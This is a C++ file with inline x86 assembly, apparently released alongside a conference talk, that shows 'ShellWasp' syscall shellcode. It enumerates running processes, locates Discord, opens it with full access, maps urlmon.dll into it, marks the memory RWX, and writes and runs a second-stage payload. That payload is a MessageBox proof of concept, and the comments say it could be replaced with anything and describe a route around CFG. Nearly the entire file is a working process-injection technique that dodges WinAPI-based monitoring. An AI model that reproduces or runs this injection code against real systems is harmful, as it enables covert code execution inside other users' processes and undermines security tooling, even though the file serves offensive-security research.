// Author: Dr. Bramwell Brizendine
// Event: Black Hat Middle East and Africa in Riyadh, KSA
// This uses the ShellWasp technique for syscall shellcode
// ShellWasp - for Syscall Shellcode: https://github.com/Bw3ll/ShellWasp

// This inline Assembly can allow the syscall shellcode to be tested (and edited) simply. 
// I will release it in shellcode form at a little time--I have some additional minor cleanup to do. 
// The pure shellcode (non-inline Assembly) one I have has some minor stability issues before I can release it. 
// Description on compiling and using with Developer prompt discussed later.

#include <windows.h>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <string>

using namespace std;
int main()
{

// I do not actually use this for the second stage payload. See below with _emit keywords.
unsigned char myShell[] = "\x90\x90\x90\x90\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68\x50\x77\x6e\x64\x89\xe7\x52\x68\x59\x65\x73\x73\x89\xe1\x52\x57\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31\xc9\x51\xff\xd0";

void* mem2 = malloc(0x1060);
memcpy(&mem2, &myShell, sizeof(myShell));
	

// This syscall shellcode (inlineAssembly version)

//		; ShellWasp - for Syscall Shellcode: https://github.com/Bw3ll/ShellWasp
// 		; 
// 		; Note: This is proof-of-concept, just to demonstrate what is possible with syscall shellcode.
// 		; It utilizes the ShellWasp approach to syscall shellcode, with a syscall array having been created 
// 		; by it. This syscall shellcode works for Windows 7 and 10/11. Note that with Windows 10/11, CFG will
// 		; cause the the second stage shellcode - a messagebox - to immediately terminate. It does, however,
// 		; succeed in the sense that all syscalls work. An additional syscall to NtSetInformationVirtualMemory 
//      ; could create a CFG exception. I had success with the corresponding WinAPI function, 
//      ; SetProcessValidCallTargets (that is not included). Either one creates a CFG exception that can allow
//      ;  for the process injection to succeed in spite of CFG. 
//      ;  The goal here is to avoid  using WinAPI functions, so that is not included. 
//      ;  Another reader can implement theNtSetInformationVirtualMemory.
// 		; With Windows 7, there is no CFG, and it works without issue.
// 		;
// 		; The goal of this shellcode is to enumerate all active processes, find Discord and determine its 
// 		; PID,and then to create a library, Urlmon.dll, which is then used to inject a second stage payload. 
// 		; The originalprocess then must activate the second stage shellcode, which is present in Discord.exe. 
// 		; In order to do this, the shellcode loads urlmon.dll into the target process and gives it RWX. It 
// 		; then copies the second stage payload over into our unneeded urlmon.dll, 0x3000 bytes from the start. 
// 		; The shellcode then begins to execude the second stage shellcode. 

// 		; If someone wanted to, they could substitute Discord for test.exe or any non-CFG process on Win10/11, for 
// 		; testing purposes. CFG does not exist on Win7. 


//	; The syscalls utilized follow:
//	;		1.	NtAllocateVirtualMemory
//	;		2.	NtQuerySystemInformation
//	;		3.	NtOpenProcess
//	;		4.	NtCreateFile
//	;		5.	NtCreateSection
//	;		6.	NtMapViewofSection
//	;		7.	NtProtectVirtualMemory
//	;		8.	NtWriteVirtualMemory
//	;		9.	NtCreateThreadEx
//	;		10.	NtWaitForSingleObject (optional - not needed for Discord)
//	;
//	;		With inline Assembly, I typically use Sublime to write and then Developer prompt to compile.
//	;		The syntax for compiling with Developer Prompt is as follows:
//	;		cl filename.cpp 
//	;		
//	;		Please note also that one reason I use inline Assembly is the ability to use int 3, which is very 
//	;		helpful when debugging in WinDbg. This is a breakpoint. If you do not wish to use those, you will 
//	;		want to comment those out! A program with int 3 can only be run inside a debugger - otherwise it errors
//	;		out. Thus, if using this outside a debugger, the int 3's should be commented out!!


__asm {
	jmp start
	ourSyscall:             ; Syscall Function
	cmp dword ptr [edi-0x4],0xa
	jne win7

	win10:                  ; Windows 10/11 Syscall
	call dword ptr fs:[0xc0]
	ret

	win7:                   ; Windows 7 Syscall
	xor ecx, ecx
	lea edx, [esp+4]
	call dword ptr fs:[0xc0]
	add esp, 4
	ret

	start:
int 3 ; breakpoint - remove if outside of debugger
mov eax, fs:[0x30]
mov ebx, [eax+0xac]
mov eax, [eax+0xa4]
mov ecx, esp
sub esp, 0x1000

cmp bl, 0x64            ; 21H2, Win10 release
jl less1
push 0x18               ; NtAllocateVirtualMemory
push 0x36               ; NtQuerySystemInformation
push 0x26               ; NtOpenProcess
push 0x55               ; NtCreateFile
push 0x4a               ; NtCreateSection
push 0x28               ; NtMapViewOfSection
push 0x50               ; NtProtectVirtualMemory
push 0x3a               ; NtWriteVirtualMemory
push 0xc1               ; NtCreateThreadEx
push 0xd0004            ; NtWaitForSingleObject
jmp saveSyscallArray
less1:
cmp bl, 0x63            ; 21H1, Win10 release
jl less2
push 0x18               ; NtAllocateVirtualMemory
push 0x36               ; NtQuerySystemInformation
push 0x26               ; NtOpenProcess
push 0x55               ; NtCreateFile
push 0x4a               ; NtCreateSection
push 0x28               ; NtMapViewOfSection
push 0x50               ; NtProtectVirtualMemory
push 0x3a               ; NtWriteVirtualMemory
push 0xc1               ; NtCreateThreadEx
push 0xd0004            ; NtWaitForSingleObject
jmp saveSyscallArray
less2:
cmp bl, 0xF0            ; 21H2, Win11 release
jl less3
push 0x18               ; NtAllocateVirtualMemory
push 0x36               ; NtQuerySystemInformation
push 0x26               ; NtOpenProcess
push 0x55               ; NtCreateFile
push 0x4a               ; NtCreateSection
push 0x28               ; NtMapViewOfSection
push 0x50               ; NtProtectVirtualMemory
push 0x3a               ; NtWriteVirtualMemory
push 0xc5               ; NtCreateThreadEx
push 0xd0004            ; NtWaitForSingleObject
jmp saveSyscallArray
less3:
cmp bl, 0xB1            ; Win7, Sp1 release
jl end2
push 0x15               ; NtAllocateVirtualMemory
push 0x33               ; NtQuerySystemInformation
push 0x23               ; NtOpenProcess
push 0x52               ; NtCreateFile
push 0x47               ; NtCreateSection
push 0x25               ; NtMapViewOfSection
push 0x4d               ; NtProtectVirtualMemory
push 0x37               ; NtWriteVirtualMemory
push 0xa5               ; NtCreateThreadEx
push 0x1                ; NtWaitForSingleObject

saveSyscallArray:
push eax
mov edi, esp
add edi, 0x4
mov esp, ecx

int 3  ; breakpoint - remove if outside of debugger

	xor ecx, ecx
	mov [ebp-0x20], ecx
	mov [ebp-0x30], ecx

		mov dword ptr[ebp - 0x18], 0x600000  ; 0x30000
		restart:
		push edi

		push 0x40							// ; ULONG Protect
		push 0x3000 						 // ; ULONG AllocationType
		lea ebx, dword ptr[ebp - 0x18]		
		push ebx 							//	; PSIZE_T RegionSize
		xor ecx, ecx 
		push ecx                           // ; ULONG_PTR ZeroBits
		
		mov dword ptr[ebp - 0x280], 0
		lea ebx, dword ptr[ebp - 0x280]		
		push ebx  						// ;  PVOID *BaseAddress
		push -1 							// ; HANDLE ProcessHandle
		mov eax, [edi+0x24]     ; NtAllocateVirtualMemory syscall
		int 3 ; breakpoint - remove if outside of debugger
		call ourSyscall
				
		mov edi, [esp+0x18]

	push edi
	lea ecx, dword ptr [ebp-0x20]
	push ecx         ; PULONecxG ReturnLength
	mov ecx, dword ptr [ebp-0x18]
	push ecx         ; ULONG SystemInformationLength
	mov ecx, dword ptr[ebp - 0x280]
	push ecx         ; PVOID SystemInformation
	push 0x00000005         ; SYSTEM_INFORMATION_CLASS SystemInformationClass   -> 0x05 	SystemProcessInformation

	mov eax, [edi+0x20]     ; NtQuerySystemInformation syscall
	int 3 ; breakpoint - remove if outside of debugger
	call ourSyscall

	mov edi, [esp+0x10]
	push edi

	mov ecx, dword ptr [ebp-0x20]
	mov dword ptr[ebp - 0x18], ecx


	mov dword ptr [ebp-0x266], esp
	cmp eax, 0xC0000004 
	je restart
	mov esp, dword ptr [ebp-0x266]

	xor edx, edx  			; Discord.exe
	push edx
mov dx, 0x65 
push dx
mov dx, 0x78 
push dx
mov dx, 0x65 
push dx
mov dx, 0x2e 
push dx
mov dx, 0x64 
push dx
mov dx, 0x72 
push dx
mov dx, 0x6f 
push dx
mov dx, 0x63 
push dx
mov dx, 0x73 
push dx
mov dx, 0x69 
push dx
mov dx, 0x44
push dx


// xor edx, edx   ; test.exe   ; if test.exe, must change sizes in Punicode struct
// push edx
// mov dx, 0x65 
// push dx
// mov dx, 0x78 
// push dx
// mov dx, 0x65 
// push dx
// mov dx, 0x2e 
// push dx
// mov dx, 0x74 
// push dx
// mov dx, 0x73 
// push dx
// mov dx, 0x65 
// push dx
// mov dx, 0x74
// push dx
// // int 3

	mov dword ptr [ebp-0xdd], esp

	xor edx, edx
	push edx		  ; SecurityQualityOfService
	push edx		  ; SecurityDescriptor
	push edx		  ; Attributes
	push edx		  ; ObjectName
	push edx		  ; RootDirectory
	push 0x00000018   ; Length
	mov [ebp-0xfe], esp   ; _OBJECT_ATTRIBUTES 

    ; the searching  is borrowed from the presentation Tarek and I did at DEF CON 30-- so that credit goes to Tarek.

	enumerateProcesses:
		mov eax, dword ptr[ebp-0x280] // start of SystemInformation structure, with all processes
		cmp eax, 0 					 ; check to see if reached end
		je finishedProcesses

		mov ebx, dword ptr[ebp - 0x280]
		mov esi, dword ptr[ebx+0x3c]   		; dereferencing the location for unicode string text for process name
		cmp esi, 0
		je nextProc
		mov edi, dword ptr[ebp-0xdd] // Source
		mov ecx, 8
		// int 3
		cld 
		repe  cmpsb						; check for match for target process
		jecxz  match
		nextProc:
		add eax, dword ptr[eax]			; no match - add the size of current entry to enumerate next process
		mov dword ptr[ebp-0x280], eax  	; save current process 
		jmp enumerateProcesses

	finishedProcesses:

	match:

		mov edi, [esp+0x32]

		push edi
		xor ecx, ecx
		push ecx				; uniquethread
		push dword ptr[ebp-0x280]				; uniqueprocess
		mov [ebp-0x1ff], esp 	; ptr to ClientId

		mov ecx, esp
		mov eax, dword ptr[ebx+0x44] //pid
		mov dword ptr[ecx], eax

	xor edx, edx
	push edx
	mov dword ptr  [ebp-0xbe], esp   ; ProcessHandle
	mov ecx, [ebp-0x1ff]
	push ecx     		    ; PCLIENT_ID ClientId
	mov ecx, [ebp-0xfe]
	push ecx      		    ; POBJECT_ATTRIBUTES ObjectAttributes
	push 0x1FFFFF           ; ACCESS_MASK AccessMask PROCESS_ALL_ACCESS
	mov ecx, [ebp-0xbe]
	push ecx	            ; PHANDLE ProcessHandle

	int 3 ; breakpoint - remove if outside of debugger
	mov eax, [edi+0x1c]     ; NtOpenProcess syscall
call ourSyscall

mov edi, [esp+0x1c]
;int 3
push edi

; start ntcreatesection

; create SectionHandle
xor edx, edx
mov [ebp-0x324], edx

; create ObjectAttributes structure
; todo
mov [ebp-0x342], esp

;create PLARGE_INTEGER MaximumSize
; todo
; PLARGE_INTEGER ByteOffset
xor ecx, ecx
	push 0x13C000   ; high part  1294336 -> 0x13C000
	push ecx  	; low part
	push 0x50
	push ecx  	; low part
mov [ebp-0x348], esp

xor edx, edx
push edx
mov dx, 0x6c 
push dx
mov dx, 0x6c 
push dx
mov dx, 0x64 
push dx
mov dx, 0x2e 
push dx
mov dx, 0x6e 
push dx
mov dx, 0x6f 
push dx
mov dx, 0x6d 
push dx
mov dx, 0x6c 
push dx
mov dx, 0x72 
push dx
mov dx, 0x75 
push dx
mov dx, 0x5c 
push dx
mov dx, 0x34 
push dx
mov dx, 0x36 
push dx
mov dx, 0x57 
push dx
mov dx, 0x4f 
push dx
mov dx, 0x57 
push dx
mov dx, 0x73 
push dx
mov dx, 0x79 
push dx
mov dx, 0x53 
push dx
mov dx, 0x5c 
push dx
mov dx, 0x73 
push dx
mov dx, 0x77 
push dx
mov dx, 0x6f 
push dx
mov dx, 0x64 
push dx
mov dx, 0x6e 
push dx
mov dx, 0x69 
push dx
mov dx, 0x57 
push dx
mov dx, 0x5c 
push dx
mov dx, 0x3a 
push dx
mov dx, 0x63 
push dx
mov dx, 0x5c 
push dx
mov dx, 0x3f 
push dx
mov dx, 0x3f 
push dx
mov dx, 0x5c
push dx

mov [ebp-0x2fd], esp
; int 3
	; UNICODE_STRING REG_PATH
	xor edx, edx
	push dword ptr [ebp-0x2fd] ; Buffer
	mov dx, 70
	push dx ; Max Length
	mov dx, 68
	push dx ; Length
	mov [ebp-0xed], esp ; 
	; _IO_STATUS_BLOCK 
	xor ecx, ecx
	push ecx  ; ulong_ptr information
	push ecx ; pvoid pointer reserved
	push ecx  ; ntstatus status
	mov [ebp-0x48], esp  ; out PIO_STATUS_BLOCK IoStatusBlock

	; _OBJECT_ATTRIBUTES
	xor edx, edx
	xor ecx, ecx
	push edx ; SecurityQualityOfService = NULL
	push edx ; SecurityDescriptor = NULL
	inc ecx
	shl ecx, 6
	push ecx ; Attributes = OBJ_CASE_INSENSITIVE = 0x40 
    push dword ptr [ebp-0xed] ; UNICODE_STRING
	push edx ; Root Directory = NULL
	push 0x18 ; Length
	mov [ebp-0x24], esp ; OBJECT_ATTR
	
	xor ecx, ecx
	mov [ebp-0x3dd], ecx ; PHANDLE FileHandle
	mov [ebp-0xee], ecx ; out PIO_STATUS_BLOCK IoStatusBlock

; start ntcreatefile
push 0x00000000         ; ULONG EaLength
push 0x00000000         ; PVOID EaBuffer
push 0x00000860         ; ULONG CreateOptions  FILE_SYNCHRONOUS_IO_NONALERT   0x00000020  | FILE_RANDOM_ACCESS   0x00000800 |  FILE_NON_DIRECTORY_FILE   0x00000040
push 0x0003         ; ULONG CreateDisposition  	OPEN_EXISTING     = 3   FILE_OVERWRITE_IF   0x00000005  
push 0x1         ; ULONG ShareAccess   	2 	FILE_SHARE_WRITE 1 	FILE_SHARE_read
push 0x80         ; ULONG FileAttributes  128 0x80	FILE_ATTRIBUTE_NORMAL
push 0x00000000         ; PLARGE_INTEGER AllocationSize
push dword ptr [ebp-0x48] ; out PIO_STATUS_BLOCK IoStatusBlock
push dword ptr [ebp-0x24]        ; POBJECT_ATTRIBUTES ObjectAttributes
  push 0x120089;               GENERIC_READ = 120089, ACCESS_MASK DesiredAccess
lea ecx, [ebp-0x3dd]
push ecx         ; PHANDLE FileHandle

int 3 ; breakpoint - remove if outside of debugger
mov eax, [edi+0x18]     ; NtCreateFile syscall
call ourSyscall
mov edi, [esp+0xb0];	0x84 + 0x22 = 

push edi

; start ntcreatesection

; create SectionHandle
xor edx, edx
mov [ebp-0x324], edx

; create ObjectAttributes structure
; todo
mov [ebp-0x342], esp

;create PLARGE_INTEGER MaximumSize
; todo
; PLARGE_INTEGER ByteOffset
xor ecx, ecx
	push 0x13C000   ; high part  1294336 -> 0x13C000
	push ecx  	; low part
	push 0x50
	push ecx  	; low part
mov [ebp-0x348], esp

mov ecx, [ebp-0x3dd] ; out  HANDLE FileHandle not a pointer - handle
push ecx 		        ; HANDLE FileHandle
push 0x1000000         ; ULONG AllocationAttributes   UInt32 SEC_IMAGE = 0x1000000
push 0x00000002         ; ULONG SectionPageProtection   / Page Attributes  --  UInt32 PAGE_READONLY = 0x02;

mov ecx, [ebp-0x348]
push 0 		        ; PLARGE_INTEGER MaximumSize
push 0x0 		        ; POBJECT_ATTRIBUTES ObjectAttributes   NULL
push  0x10000000        	; ACCESS_MASK DesiredAccess      SECTION_ALL_ACCESS = 0x10000000,      SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUT
lea ecx, [ebp-0x324] 
push ecx 		        ; PHANDLE SectionHandle
int 3	 ; breakpoint - remove if outside of debugger	
mov eax, [edi+0x14]     ; NtCreateSection syscall
call ourSyscall

mov edi, [esp+0x2c]

;ViewSize -> 0
xor ecx, ecx
push ecx
mov [ebp-0x98], ecx
mov [ebp-0x88], ecx

retry:
push edi
push 0x00000040       ; ULONG Protect  PAGE_READWRITE 04  / PAGE_READONLY = 0x02
push 0x00000000         ; ULONG AllocationType  NULL
push 0x00000001         ; DWORD InheritDisposition  ViewShare 
lea ecx, [ebp-0x98]
push ecx      		    ; PULONG ViewSize
push 0x00000000         ; PLARGE_INTEGER SectionOffset NULL
push 0x00000000         ; ULONG CommitSize	NULL
push 0x00000000         ; ULONG stackZeroBits 	NULL
lea ecx, [ebp-0x88]
push ecx         ; PVOID *BaseAddress  NULL
// ; int 3
mov ecx, dword ptr[ebp-0xbe] 	; 
mov ecx, dword ptr [ecx]
push ecx			         ; HANDLE ProcessHandle
push dword ptr [ebp-0x324]         ; HANDLE SectionHandle

int 3 ; breakpoint - remove if outside of debugger
mov eax, [edi+0x10]     ; NtMapViewOfSection syscall
call ourSyscall

mov edi, [esp+0x28]  ; 0x28 + 0x4 = 
push edi

;;start NtProtectVirtualMemory
xor ecx, ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push 0x0000a12c  				; desired size
mov [ebp-0x64], esp 

xor ecx, ecx
push ecx
push ecx
mov [ebp-0x424], esp

mov ecx, [ebp-0x424]
push ecx  		         ; PULONG OldAccessProtection
push 0x00000040         ; ULONG NewAccessProtection
mov ecx, [ebp-0x64]
push ecx 	         ; PULONG NumberOfBytesToProtect
lea ecx, [ebp-0x88]
push ecx 	          ; PVOID *BaseAddress
mov ecx, dword ptr[ebp-0xbe] 	; 
mov ecx, dword ptr [ecx]
push ecx		        ; HANDLE ProcessHandle

int 3 ; breakpoint - remove if outside of debugger
// mov eax, 0x4D          ; NtProtectVirtualMemory syscall
mov eax, [edi+0xc]      ; NtProtectVirtualMemory syscall
call ourSyscall

mov edi, [esp+0x34] ; 0x14 + 20= 34
push edi

;;; start ntwritevirtualmemory

push 0								; PULONG NumberOfBytesWritten
push 0x100 							; ULONG NumberOfBytesToWrite

; Note: The inline Assembly (VS) way of doing self-location is a little screwy, so traditional call pop way does not work as easily as it word doing NASM. This is one place where an adjustment is necessary when converting to shellcode

lea ecx, ourShell
add ecx, 0x4
push ecx 							; PVOID Buffer

lea ecx, [ebp-0x88]
mov edx, dword ptr [ecx]
add edx, 0x3000
mov dword ptr [ebp-0x88], edx
mov ecx, [ebp-0x88]
push ecx  						; PVOID BaseAddress
mov ecx, dword ptr[ebp-0xbe] 	
mov ecx, dword ptr [ecx]
push ecx 						; HANDLE ProcessHandle
int 3 ; breakpoint - remove if outside of debugger

mov eax, [edi+0x8]      ; NtWriteVirtualMemory syscall
call ourSyscall
 
mov edi, [esp+0x14]
push edi

xor edx, edx

		push edx 						; NULL pBytesBuffer
		push edx 						; NULL sizeOfStackReserve
		push edx 						; NULL sizeOfStackCommit
		push edx 						; NULL stackZeroBits
		push edx 						; FALSE bCreateSuspsended
		push edx 						; 0 lpParameter

		mov ebx, dword ptr[ebp - 0x88]		
		push ebx 						; pMemoryAllocation StartRoutine 
		mov ecx, dword ptr[ebp-0xbe] 	;   ProcessHandle
		mov ecx, dword ptr [ecx]
		push ecx 						; hCurrentProcess
		push 0 							; pObjectAttributes
		push 0x1fffff  					; PROCESS_ALL_ACCESS; 0x3e0000 desiredACcess = Specific_rights_all + standard_rights_all
		mov dword ptr[ebp - 0x290], 0   ; hThread
		lea ecx, dword ptr[ebp - 0x290] ; hThread
		push ecx ; hThread
		int 3 ; breakpoint - remove if outside of debugger
		mov eax, [edi+0x4]      ; NtCreateThreadEx syscall
		call ourSyscall
		mov edi, [esp+0x2c]
		push edi

		push 0 								 ; PLARGE_INTEGER TimeOut
		push 1	; 						     ; BOOLEAN Alertable TRUE
		push dword ptr[ebp - 0x290]          ; HANDLE ObjectHandle
		int 3 ; breakpoint - remove if outside of debugger
		mov eax, [edi]          ; NtWaitForSingleObject syscall
		call ourSyscall
		mov edi, [esp+0xc]
		push edi

		int 3 ; breakpoint - remove if outside of debugger


;  This is the stage two payload. The _emit keyword is how you can create those in inline Assembly for Visual Studio. In traditional shellcode, we would present this in a different way. The stage two payload is just a simple POC messagebox, but it could be exchanged for anything. There are other ways of doing this in inline ASsembly, but I prefer this way, as it is closer to actual shellcode.

ourShell:
_emit 0x90
_emit 0x90
_emit 0x90
_emit 0x90
_emit 0x31
_emit 0xc9
_emit 0xf7
_emit 0xe1
_emit 0x64
_emit 0x8b
_emit 0x41
_emit 0x30
_emit 0x8b
_emit 0x40
_emit 0x0c
_emit 0x8b
_emit 0x70
_emit 0x14
_emit 0xad
_emit 0x96
_emit 0xad
_emit 0x8b
_emit 0x58
_emit 0x10
_emit 0x8b
_emit 0x53
_emit 0x3c
_emit 0x01
_emit 0xda
_emit 0x8b
_emit 0x52
_emit 0x78
_emit 0x01
_emit 0xda
_emit 0x8b
_emit 0x72
_emit 0x20
_emit 0x01
_emit 0xde
_emit 0x31
_emit 0xc9
_emit 0x41
_emit 0xad
_emit 0x01
_emit 0xd8
_emit 0x81
_emit 0x38
_emit 0x47
_emit 0x65
_emit 0x74
_emit 0x50
_emit 0x75
_emit 0xf4
_emit 0x81
_emit 0x78
_emit 0x04
_emit 0x72
_emit 0x6f
_emit 0x63
_emit 0x41
_emit 0x75
_emit 0xeb
_emit 0x81
_emit 0x78
_emit 0x08
_emit 0x64
_emit 0x64
_emit 0x72
_emit 0x65
_emit 0x75
_emit 0xe2
_emit 0x8b
_emit 0x72
_emit 0x24
_emit 0x01
_emit 0xde
_emit 0x66
_emit 0x8b
_emit 0x0c
_emit 0x4e
_emit 0x49
_emit 0x8b
_emit 0x72
_emit 0x1c
_emit 0x01
_emit 0xde
_emit 0x8b
_emit 0x14
_emit 0x8e
_emit 0x01
_emit 0xda
_emit 0x89
_emit 0xd5
_emit 0x31
_emit 0xc9
_emit 0x51
_emit 0x68
_emit 0x61
_emit 0x72
_emit 0x79
_emit 0x41
_emit 0x68
_emit 0x4c
_emit 0x69
_emit 0x62
_emit 0x72
_emit 0x68
_emit 0x4c
_emit 0x6f
_emit 0x61
_emit 0x64
_emit 0x54
_emit 0x53
_emit 0xff
_emit 0xd2
_emit 0x68
_emit 0x6c
_emit 0x6c
_emit 0x61
_emit 0x61
_emit 0x66
_emit 0x81
_emit 0x6c
_emit 0x24
_emit 0x02
_emit 0x61
_emit 0x61
_emit 0x68
_emit 0x33
_emit 0x32
_emit 0x2e
_emit 0x64
_emit 0x68
_emit 0x55
_emit 0x73
_emit 0x65
_emit 0x72
_emit 0x54
_emit 0xff
_emit 0xd0
_emit 0x68
_emit 0x6f
_emit 0x78
_emit 0x41
_emit 0x61
_emit 0x66
_emit 0x83
_emit 0x6c
_emit 0x24
_emit 0x03
_emit 0x61
_emit 0x68
_emit 0x61
_emit 0x67
_emit 0x65
_emit 0x42
_emit 0x68
_emit 0x4d
_emit 0x65
_emit 0x73
_emit 0x73
_emit 0x54
_emit 0x50
_emit 0xff
_emit 0xd5
_emit 0x83
_emit 0xc4
_emit 0x10
_emit 0x31
_emit 0xd2
_emit 0x31
_emit 0xc9
_emit 0x52
_emit 0x68
_emit 0x50
_emit 0x77
_emit 0x6e
_emit 0x64
_emit 0x89
_emit 0xe7
_emit 0x52
_emit 0x68
_emit 0x59
_emit 0x65
_emit 0x73
_emit 0x73
_emit 0x89
_emit 0xe1
_emit 0x52
_emit 0x57
_emit 0x51
_emit 0x52
_emit 0xff
_emit 0xd0
_emit 0x83
_emit 0xc4
_emit 0x10
_emit 0x68
_emit 0x65
_emit 0x73
_emit 0x73
_emit 0x61
_emit 0x66
_emit 0x83
_emit 0x6c
_emit 0x24
_emit 0x03
_emit 0x61
_emit 0x68
_emit 0x50
_emit 0x72
_emit 0x6f
_emit 0x63
_emit 0x68
_emit 0x45
_emit 0x78
_emit 0x69
_emit 0x74
_emit 0x54
_emit 0x53
_emit 0xff
_emit 0xd5
_emit 0x31
_emit 0xc9
_emit 0x51
_emit 0xff
_emit 0xd0

end2:
nop
	}
	return 0;
}
